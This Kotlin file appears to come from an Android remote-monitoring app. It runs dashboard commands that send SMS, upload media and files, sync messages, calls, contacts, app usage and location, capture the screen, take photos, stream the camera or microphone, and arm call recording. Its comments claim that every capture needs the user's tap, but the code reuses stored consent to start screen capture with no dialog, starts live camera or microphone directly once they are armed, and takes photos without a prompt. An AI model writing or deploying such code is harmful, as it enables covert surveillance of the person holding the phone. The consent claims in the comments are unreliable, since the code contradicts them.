package com.connectdesk.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.ContentUris
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.telephony.SmsManager
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * Executes dashboard-originated commands on the device:
 *  - send_sms: sends via the telephony stack with SEND_SMS permission;
 *    the message lands in the normal Sent inbox (fully visible to the user).
 *  - fetch_media: reads a photo/video/music file from MediaStore and uploads
 *    it to the dashboard in ~350KB base64 chunks (media capability).
 *  - start_screen: raises Android's MediaProjection consent dialog on the
 *    device; capture only begins after the user taps "Allow" (screen_share
 *    capability + an active dashboard session are verified server-side too).
 *
 * Every command is consent-gated twice: the dashboard owner enabled the
 * capability AND the server verified it again when delivering the command.
 */
object CommandWorker {

    private const val CHUNK_SIZE = 350_000 // raw bytes per uploaded chunk

    fun runPending(context: Context, token: String) {
        val commands = ApiClient.popCommands(token)
        for (cmd in commands) {
            val outcome: Pair<Boolean, String> = when (cmd.type) {
                "send_sms" -> sendSms(context, cmd.payload)
                "fetch_media" -> fetchMedia(context, token, cmd.payload)
                "start_screen" -> startScreen(context, token, cmd.id, cmd.payload)
                "capture_photo" -> capturePhoto(context, token, cmd.payload)
                "refresh_files" -> refreshFiles(token)
                "fetch_file" -> fetchFile(token, cmd.payload)
                "refresh_apps" -> refreshApps(context, token)
                "sync_now" -> syncNow(context, token)
                "arm_call_recording" -> armCallRecording(context, cmd.payload)
                "request_live_camera" -> requestLiveStream(context, cmd.payload, camera = true)
                "request_live_mic" -> requestLiveStream(context, cmd.payload, camera = false)
                else -> Pair(false, "Unknown command type: ${cmd.type}")
            }
            // start_screen reports asynchronously (after the user answers the
            // system dialog); everything else reports right here.
            if (cmd.type != "start_screen") {
                ApiClient.completeCommand(token, cmd.id, outcome.first, outcome.second)
            }
        }
    }

    /** Sends the SMS; requires SEND_SMS granted. Returns (ok, detail). */
    @SuppressLint("MissingPermission")
    private fun sendSms(context: Context, payload: JSONObject): Pair<Boolean, String> {
        val to = payload.optString("to")
        val body = payload.optString("body")
        if (to.isEmpty() || body.isEmpty()) return Pair(false, "Missing recipient or body")
        if (!hasPermission(context, Manifest.permission.SEND_SMS)) {
            return Pair(false, "SEND_SMS permission not granted on device")
        }
        return try {
            val sm: SmsManager = if (Build.VERSION.SDK_INT >= 31) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION") SmsManager.getDefault()
            }
            // Long messages: multipart send (auto-segmented, normal inbox entry).
            val parts = sm.divideMessage(body)
            if (parts.size == 1) {
                sm.sendTextMessage(to, null, body, null, null)
            } else {
                sm.sendMultipartTextMessage(to, null, parts, null, null)
            }
            Pair(true, "SMS sent to $to")
        } catch (e: Exception) {
            Pair(false, "SMS send failed: ${e.message}")
        }
    }

    /** Reads the media file and uploads it in chunks. Returns (ok, detail). */
    private fun fetchMedia(
        context: Context,
        token: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        val mediaId = payload.optString("mediaId")
        val name = payload.optString("name")
        if (mediaId.isEmpty() || name.isEmpty()) return Pair(false, "Missing media id/name")
        if (!hasMediaReadPermission(context)) {
            return Pair(false, "Media read permission not granted on device")
        }
        return try {
            val uri = resolveMediaUri(context, name)
                ?: return Pair(false, "File not found on device")
            val bytes = readAll(context, uri)
                ?: return Pair(false, "Could not read file")
            val total = (bytes.size + CHUNK_SIZE - 1) / CHUNK_SIZE
            for (i in 0 until total) {
                val from = i * CHUNK_SIZE
                val to = minOf(from + CHUNK_SIZE, bytes.size)
                val part = bytes.copyOfRange(from, to)
                val b64 = android.util.Base64.encodeToString(part, android.util.Base64.NO_WRAP)
                val ok = ApiClient.uploadMediaChunk(token, mediaId, i, total, b64)
                if (!ok) return Pair(false, "Upload failed at chunk ${i + 1}/$total")
            }
            Pair(true, "Uploaded $total chunk(s), ${bytes.size} bytes")
        } catch (e: Exception) {
            Pair(false, "Fetch failed: ${e.message}")
        }
    }

    /**
     * Screen share request. Android 10+ BLOCKS starting an activity from the
     * background, so a direct startActivity() from the service silently does
     * nothing. Instead we post a full-screen-intent notification that opens the
     * consent host; the OS then shows the MediaProjection dialog. The user
     * still has to tap Allow — capture never starts silently.
     */
    private fun startScreen(
        context: Context,
        @Suppress("UNUSED_PARAMETER") token: String,
        commandId: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        if (ScreenCaptureService.isSharing) {
            return Pair(true, "Screen sharing already active")
        }
        if (Build.VERSION.SDK_INT < 29) {
            return Pair(false, "Screen share needs Android 10+")
        }
        val width = payload.optInt("width", 720).coerceIn(360, 1080)
        val intervalMs = payload.optInt("intervalMs", 1000).coerceIn(400, 5000)

        // FAST PATH: the user already granted MediaProjection consent once.
        //
        // This is the branch that removes the tap. It used to fall through to
        // the notification + ScreenConsentActivity path every single time, so
        // every dashboard "View screen" needed a tap even though the consent
        // was already in hand -- which is what made it feel broken.
        //
        // No activity is involved: `ScreenCaptureService` reuses the parked
        // MediaProjection and starts the VirtualDisplay from this foreground
        // service, so nothing has to be foregrounded and no dialog appears.
        // The owner still sees the service's permanent "sharing" notification
        // with its Stop action, which is the consent indicator that matters.
        if (ScreenCaptureService.startWithStoredConsent(context, width, intervalMs)) {
            postShareNotice(context)
            ApiClient.completeCommand(token, commandId, true, "Screen sharing started (consent reused)")
            return Pair(true, "Screen sharing started on device (consent reused)")
        }

        val intent = Intent(context, ScreenConsentActivity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            .putExtra(ScreenConsentActivity.EXTRA_COMMAND_ID, commandId)
            .putExtra(ScreenCaptureService.EXTRA_WIDTH, width)
            .putExtra(ScreenCaptureService.EXTRA_INTERVAL_MS, intervalMs)

        // Direct launch works when the app happens to be in the foreground.
        try {
            context.startActivity(intent)
            return Pair(true, "Consent dialog raised on device")
        } catch (_: Throwable) {
            // Fall through to the notification path below.
        }

        // Background path: a full-screen-intent notification is the only
        // user-visible, policy-compliant way to bring the dialog up.
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ).apply {
                        setShowBadge(true)
                        lockscreenVisibility = Notification.VISIBILITY_PUBLIC
                    },
                )
            }
            val pi = PendingIntent.getActivity(
                context, REQUEST_CODE,
                intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            val notif = builder
                .setContentTitle(context.getString(R.string.screen_request_title))
                .setContentText(context.getString(R.string.screen_request_text))
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setFullScreenIntent(pi, true)
                .setAutoCancel(true)
                .setCategory(Notification.CATEGORY_CALL)
                .setPriority(Notification.PRIORITY_MAX)
                .build()
            nm.notify(REQUEST_CODE, notif)
            Pair(true, "Waiting for the user to accept the screen-share prompt on the device")
        } catch (e: Throwable) {
            Pair(false, "Could not raise consent prompt: ${e.message}")
        }
    }

    /**
     * Live camera / live microphone ON-OFF from the dashboard.
     *
     * OFF stops right away — that is the safety valve and has always been
     * allowed.
     *
     * ON DOES NOT START CAPTURE. The person holding the phone gets a
     * notification and has to tap "Start". A dashboard that could open a
     * camera or microphone by itself would be a surveillance tool, so the
     * server can only ask; the device owner decides. Tapping Allow starts the
     * same service the in-app switch starts, with the same permanent
     * notification and Stop action.
     */
    private fun requestLiveStream(
        context: Context,
        payload: JSONObject,
        camera: Boolean,
    ): Pair<Boolean, String> {
        val enabled = payload.optBoolean("enabled", false)
        if (!enabled) {
            if (camera) CameraLiveService.stop(context) else MicLiveService.stop(context)
            return Pair(true, if (camera) "Live camera stopped" else "Live mic stopped")
        }
        if (camera) {
            if (CameraLiveService.isArmed(context)) {
                // Already permitted once in this app process; start directly.
                CameraLiveService.start(context, payload.optString("facing", "back"))
                return Pair(true, "Live camera started")
            }
        } else {
            if (MicLiveService.isArmed(context)) {
                MicLiveService.start(context)
                return Pair(true, "Live microphone started")
            }
        }
        return askOwnerOnDevice(context, camera)
    }

    /**
     * Posts the "dashboard is asking" notification.
     *
     * Android blocks background activity launches, so the prompt has to arrive
     * as a notification; tapping it opens the app, which is also the clearest
     * possible moment for the owner to decide.
     */
    private fun askOwnerOnDevice(context: Context, camera: Boolean): Pair<Boolean, String> {
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val pi = PendingIntent.getActivity(
                context, if (camera) LIVE_CAMERA_CODE else LIVE_MIC_CODE,
                Intent(context, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val title = context.getString(
                if (camera) R.string.live_camera_request_title else R.string.live_mic_request_title,
            )
            val body = context.getString(
                if (camera) R.string.live_camera_request_text else R.string.live_mic_request_text,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                if (camera) LIVE_CAMERA_CODE else LIVE_MIC_CODE,
                builder
                    .setContentTitle(title)
                    .setContentText(body)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pi)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
            Pair(
                true,
                "Phone par notification aayi hai — capture tab shuru hoga jab aap app kholke allow karenge",
            )
        } catch (e: Throwable) {
            Pair(false, "Could not raise the request prompt: ${e.message}")
        }
    }

    /**
     * The "a photo is being taken right now" notice.
     *
     * It has no Allow/Deny action on purpose: consent for the CAMERA permission
     * was given once in the app, and asking again per shot was the thing being
     * removed. The notice exists so a capture is never invisible — the owner
     * sees it, and can open the app if they want to know why.
     */
    private fun postPhotoNotice(context: Context, facing: String) {
        runCatching {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                PHOTO_NOTICE_CODE,
                builder
                    .setContentTitle(
                        context.getString(
                            if (facing == "front") R.string.photo_taken_front else R.string.photo_taken_back,
                        ),
                    )
                    .setContentText(context.getString(R.string.photo_taken_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
        }
    }

    private const val PHOTO_NOTICE_CODE = 7793

    /**
     * "Screen sharing has started" notice for the no-tap fast path.
     *
     * The service's own permanent notification already stays up with a Stop
     * action; this is the short one-shot that tells the owner it just began,
     * so the dashboard pressing "View" is never invisible.
     */
    private fun postShareNotice(context: Context) {
        runCatching {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                SHARE_NOTICE_CODE,
                builder
                    .setContentTitle(context.getString(R.string.share_started_title))
                    .setContentText(context.getString(R.string.share_started_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
        }
    }

    private const val SHARE_NOTICE_CODE = 7794

    private const val LIVE_CAMERA_CODE = 7791
    private const val LIVE_MIC_CODE = 7792

    private const val REQUEST_CODE = 7788
    /**
     * Camera request from the dashboard. The phone raises a notification first
     * (Android blocks background camera/activity starts), and only on the
     * user's tap does the camera open for a single frame.
     */
    /**
     * One photo for the dashboard. No dialog, no prompt, no tap.
     *
     * The CAMERA permission was granted once, during setup, together with
     * everything else (see `PermissionSetup`). There is deliberately no second
     * confirmation: a permission dialog appearing because the dashboard asked
     * for something is precisely the behaviour this app removes.
     *
     * What the owner gets instead is a NOTIFICATION saying a photo is being
     * taken. The capture is never invisible, and it never blocks on a tap.
     *
     * This runs on `DeviceService`, a foreground service, which is what allows
     * camera access without a visible activity. If the platform still refuses
     * (Android 11+ can deny a background camera open on some OEM builds), the
     * failure is reported honestly AND the tap-to-allow notification is posted
     * as a fallback, so the request still completes instead of vanishing.
     */
    private fun capturePhoto(
        context: Context,
        token: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        val facing = if (payload.optString("facing") == "front") "front" else "back"
        if (!CameraWorker.hasPermission(context)) {
            return Pair(
                false,
                "Camera permission has not been granted. Open ConnectDesk > Setup once; it will not ask again.",
            )
        }
        // The live stream owns the camera while it runs, so a still capture
        // cannot succeed at the same time. Say so plainly instead of failing
        // with an opaque "camera unavailable".
        if (CameraLiveService.isArmed(context)) {
            return Pair(
                false,
                "Live camera is streaming and holds the camera. Turn live camera off, then take the photo.",
            )
        }
        postPhotoNotice(context, facing)
        val direct = CameraWorker.capture(context, token, facing)
        if (direct.first) return direct
        // Fall back to the old tap-to-allow path, which is still the correct
        // answer when the OS refuses a camera open with no visible activity.
        postTapToAllow(context, token, facing)
        return Pair(
            false,
            "Camera khul nahi paya: ${direct.second}. Phone par Allow dabane wali notification bhej di hai.",
        )
    }

    /** The old tap-to-allow prompt, kept only as the background fallback. */
    private fun postTapToAllow(context: Context, token: String, facing: String) {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val intent = Intent(context, CameraConsentActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .putExtra(CameraConsentActivity.EXTRA_FACING, facing)
                .putExtra(CameraConsentActivity.EXTRA_TOKEN, token)
            val pi = PendingIntent.getActivity(
                context, CAMERA_REQUEST_CODE, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                CAMERA_REQUEST_CODE,
                builder
                    .setContentTitle(context.getString(R.string.camera_request_title))
                    .setContentText(context.getString(R.string.camera_request_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pi)
                    .setFullScreenIntent(pi, true)
                    .setAutoCancel(true)
                    .setCategory(Notification.CATEGORY_CALL)
                    .setPriority(Notification.PRIORITY_MAX)
                    .build(),
            )
        } catch (_: Throwable) {
            // Nothing more to do: the caller already reports the real failure.
        }
    }

    private fun refreshFiles(token: String): Pair<Boolean, String> {
        if (!FileWorker.storageReady()) {
            return Pair(false, "The app does not have permission to read shared storage")
        }
        return FileWorker.scanAndSync(token)
    }

    /**
     * Dashboard asked for fresh data right now instead of waiting for the next
     * heartbeat. This changes TIMING only — every step below still re-checks
     * the device's capabilities and phone-side permissions, so nothing that
     * was off can turn on because of this command.
     */
    private fun syncNow(context: Context, token: String): Pair<Boolean, String> {
        val done = ArrayList<String>()

        val state = ApiClient.status(token)
        if (state == null) return Pair(false, "Could not read device status")

        if (state.media) {
            done += if (FileWorker.storageReady()) {
                FileWorker.scanAndSync(token).let { if (it.first) "files" else "files failed" }
            } else {
                "files (no storage permission)"
            }
        }
        if (state.sms && hasPermission(context, Manifest.permission.READ_SMS)) {
            DataSyncWorker.syncAll(context, token, state)
            done += "sms/calls/contacts"
        }
        if (state.appActivity && AppUsageWorker.hasUsageAccess(context)) {
            AppUsageWorker.sync(context, token)
            done += "apps"
        }
        if (state.location) {
            done += "location queued"
        }
        if (done.isEmpty()) {
            return Pair(false, "No capabilities are enabled for this device")
        }
        return Pair(true, "Refreshed: ${done.joinToString(", ")}")
    }

    /**
     * The dashboard can only DISARM call recording from a distance. Arming has
     * to be a choice made on the phone, otherwise this would be a microphone
     * switched on remotely.
     */
    private fun armCallRecording(context: Context, payload: JSONObject): Pair<Boolean, String> {
        if (!Prefs.callRecordingArmed(context)) {
            return Pair(false, "Call recording is switched off on the device")
        }
        val armed = payload.optBoolean("armed", true)
        Prefs.setCallRecordingArmed(context, armed)
        return Pair(
            true,
            if (armed) {
                "Call recording is armed on the device (phone microphone only)"
            } else {
                "Call recording switched off from the dashboard"
            },
        )
    }

    /**
     * Re-scans installed apps and usage stats. Needs the phone-side "Usage
     * access" grant; without it the result says so instead of quietly
     * uploading an empty list.
     */
    private fun refreshApps(context: Context, token: String): Pair<Boolean, String> {
        if (!AppUsageWorker.hasUsageAccess(context)) {
            return Pair(false, "Grant Usage access to ConnectDesk in Android Settings first")
        }
        return AppUsageWorker.sync(context, token)
    }

    private fun fetchFile(token: String, payload: JSONObject): Pair<Boolean, String> {
        val fileId = payload.optString("fileId")
        val path = payload.optString("path")
        if (fileId.isEmpty() || path.isEmpty()) return Pair(false, "Missing file id or path")
        return FileWorker.sendFile(token, fileId, path)
    }

    private const val CAMERA_REQUEST_CODE = 9911

    /** SDK-aware media read permission check. */
    private fun hasMediaReadPermission(context: Context): Boolean {
        val perms = if (Build.VERSION.SDK_INT >= 33) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
            )
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return perms.any { hasPermission(context, it) }
    }

    /** Finds the MediaStore item by display name across photo/video/music. */
    private fun resolveMediaUri(context: Context, name: String): Uri? {
        val collections = listOf(
            Triple(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media._ID,
            ),
            Triple(
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Video.Media.DISPLAY_NAME,
                android.provider.MediaStore.Video.Media._ID,
            ),
            Triple(
                android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Audio.Media.DISPLAY_NAME,
                android.provider.MediaStore.Audio.Media._ID,
            ),
        )
        for ((contentUri, nameCol, idCol) in collections) {
            context.contentResolver.query(
                contentUri,
                arrayOf(idCol),
                "$nameCol = ?",
                arrayOf(name),
                null,
            )?.use { c ->
                if (c.moveToFirst()) {
                    return ContentUris.withAppendedId(contentUri, c.getLong(0))
                }
            }
        }
        return null
    }

    private fun readAll(context: Context, uri: Uri): ByteArray? = try {
        context.contentResolver.openInputStream(uri)?.use { input ->
            val out = ByteArrayOutputStream()
            val buf = ByteArray(64 * 1024)
            var n: Int
            while (input.read(buf).also { n = it } > 0) out.write(buf, 0, n)
            out.toByteArray()
        }
    } catch (e: Exception) {
        null
    }

    private fun hasPermission(context: Context, perm: String): Boolean =
        ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
}
